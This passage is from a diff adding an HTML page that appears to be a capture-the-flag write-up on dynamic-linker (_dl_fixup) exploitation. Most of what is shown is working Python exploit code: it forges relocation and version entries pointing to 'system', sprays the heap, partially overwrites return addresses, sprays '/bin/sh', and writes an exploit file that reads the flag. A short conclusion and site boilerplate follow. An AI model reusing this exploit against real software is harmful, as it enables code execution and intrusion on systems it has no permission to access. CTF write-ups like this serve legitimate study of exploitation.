+fake_reloc_entry = (p64(<span class="hljs-number">0x4018</span>) + p32(<span class="hljs-number">7</span>) + p32(ver_idx) + p64(<span class="hljs-number">0</span>)) + (
+    p64(<span class="hljs-number">0x4018</span>) + p32(<span class="hljs-number">7</span>) + p32(ver_idx + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)
+)
+fake_vertab_entry = p64(<span class="hljs-number">0x03</span>) + <span class="hljs-string">b&quot;system\x00&quot;</span>
+payload = fake_reloc_entry + fake_vertab_entry
+
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(maximum_heap_offset // <span class="hljs-number">0x2000</span> * <span class="hljs-number">0xC</span>):
+    <span class="hljs-comment"># write payload at offsets</span>
+    <span class="hljs-comment"># reloc_symtab_offset = 0x908</span>
+    symtab_offset = <span class="hljs-number">0x908</span> + <span class="hljs-number">0xF0</span>
+    reloc_symtab_offset = <span class="hljs-number">0x908</span>
+    payload_offsets = <span class="hljs-built_in">sorted</span>(
+        [
+            ((reloc_symtab_offset - i * <span class="hljs-number">0x10</span>) % <span class="hljs-number">0x2000</span>, payload),
+            ((reloc_symtab_offset + <span class="hljs-number">0x1000</span> - i * <span class="hljs-number">0x10</span>) % <span class="hljs-number">0x2000</span>, payload),
+            ((symtab_offset - i * <span class="hljs-number">0x10</span>) % <span class="hljs-number">0x2000</span>, fake_symtab_entry),
+            ((symtab_offset + <span class="hljs-number">0x1000</span> - i * <span class="hljs-number">0x10</span>) % <span class="hljs-number">0x2000</span>, fake_symtab_entry),
+        ],
+        key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">0</span>],
+    )
+
+    spray_buf = Buffer()
+    spray_buf.truncate(<span class="hljs-number">0x2000</span>)
+    <span class="hljs-keyword">for</span> offset, dat <span class="hljs-keyword">in</span> payload_offsets:
+        <span class="hljs-keyword">if</span> offset &gt; <span class="hljs-number">0x2000</span> - <span class="hljs-built_in">len</span>(dat):
+            <span class="hljs-keyword">continue</span>
+        spray_buf.seek(offset)
+        spray_buf.write(dat)
+
+    spray_buf.seek(<span class="hljs-number">0</span>)
+
+    spray_buf.swrite(ret_addr, <span class="hljs-number">0x76</span>)
+    spray_buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>)
+    buf.write(spray_buf.getvalue())
+    buf.commit()
+
+<span class="hljs-comment"># set lsb to main+0x10 to misalign the stack by 0x10 bytes</span>
+buf.swrite(main_addr, <span class="hljs-number">0xD0</span>)
+<span class="hljs-comment"># set lsb of __libc_start_call_main to recall main+0x10</span>
+buf.swrite(ret_addr, <span class="hljs-number">0x76</span>)
+<span class="hljs-comment"># set edi to large malloc (local variable argc by __libc_start_call_main)</span>
+buf.write_bytes(main_addr + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x4</span>, p32(<span class="hljs-number">0x2000</span>))
+
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>)
+buf.commit()
+
+<span class="hljs-comment"># reset</span>
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
+<span class="hljs-comment"># plt resolver addr</span>
+buf.swrite(ret_addr, <span class="hljs-number">0x20</span>)
+<span class="hljs-comment"># set plt index, which should be on the heap. this&#x27;ll call main</span>
+buf.write_bytes(ret_addr + <span class="hljs-number">0x8</span>, p64(plt_idx))
+<span class="hljs-comment"># this&#x27;ll also call main. it&#x27;s for stack alignment.</span>
+buf.write_bytes(ret_addr + <span class="hljs-number">0x10</span>, p64(plt_idx))
+<span class="hljs-comment"># this&#x27;ll call system.</span>
+buf.write_bytes(ret_addr + <span class="hljs-number">0x18</span>, p64(plt_idx + <span class="hljs-number">1</span>))
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">0xFF</span>)
+
+buf.commit()
+
+<span class="hljs-comment"># hop dl_fixup to alternate branch that uses stack variable for return value</span>
+buf.swrite(ret_addr, <span class="hljs-number">0xA4</span>)
+<span class="hljs-comment"># set lsb of return value of _dl_fixup to dispatch resolver</span>
+buf.swrite(ret_addr + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>)
+
+<span class="hljs-comment"># set saved rdi bottom two bytes to 0000</span>
+buf.write_bytes(<span class="hljs-number">0xA0</span>, p16(<span class="hljs-number">0x0000</span>))
+
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
+buf.commit()
+
+buf.swrite(ret_addr, <span class="hljs-number">0xA4</span>)
+buf.swrite(ret_addr + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>)
+
+
+spray = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span> * <span class="hljs-number">0x2000</span>
+buf.write_bytes(-<span class="hljs-number">0x10000</span>, spray)
+buf.swrite(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
+buf.commit()
+
+buf.write(<span class="hljs-string">b&quot;cat /flag\nexit\n&quot;</span>)
+
+<span class="hljs-comment"># write buf to file</span>
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exploit&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
+    f.write(buf.getvalue())
+
+</code></pre>
+<h1>Conclusion</h1>
+<p>Linker exploits are really neat. They can make unsolvable challenges solvable,
+thanks to their ASLR independent nature. I hope this inspires you to poke around
+in <code>_dl_fixup</code> yourself :D</p>
+<!-- HTML_TAG_END --> </div></div></section></main> <footer class="layout-md mt-8 text-lg flex flex-col" data-svelte-h="svelte-migmrp"><div class="row svelte-1t3hv3r"><span class="svelte-1t3hv3r">Twitter</span> <hr class="svelte-1t3hv3r"> <a class="link svelte-1t3hv3r" href="https://twitter.com/pepsipu">@pepsipu</a></div> <div class="row svelte-1t3hv3r"><span class="svelte-1t3hv3r">GitHub</span> <hr class="svelte-1t3hv3r"> <a class="link svelte-1t3hv3r" href="https://github.com/pepsipu">@pepsipu</a></div> <div class="row svelte-1t3hv3r"><span class="svelte-1t3hv3r">Email</span> <hr class="svelte-1t3hv3r"> <a class="link svelte-1t3hv3r" href="mailto:sh@pepsi.pw">sh@pepsi.pw</a></div> </footer> 
+			
+			<script>
+				{
+					__sveltekit_10pgr4k = {
+						base: new URL("..", location).pathname.slice(0, -1),
+						env: {}
+					};
+
+					const element = document.currentScript.parentElement;
+
+					const data = [null,null];
+
+					Promise.all([
+						import("../_app/immutable/entry/start.a0c31b60.js"),
+						import("../_app/immutable/entry/app.5062054a.js")
+					]).then(([kit, app]) => {
+						kit.start(app, element, {
+							node_ids: [0, 4],
+							data,
+							form: null,
+							error: null
+						});
+					});
+				}
+			</script>
+		</div>
+  </body>
+</html>
